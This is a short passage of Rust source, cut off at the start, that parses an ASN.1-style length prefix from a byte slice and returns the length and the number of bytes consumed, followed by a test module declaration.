    let first = *bytes.first()?;
    if first & 0x80 == 0 {
        Some((first as usize, 1))
    } else {
        let count = (first & 0x7f) as usize;
        if count == 0 || bytes.len() < 1 + count {
            return None;
        }
        let mut length = 0usize;
        for byte in &bytes[1..=count] {
            length = (length << 8) | (*byte as usize);
        }
        Some((length, 1 + count))
    }
}

#[cfg(test)]
mod tests;
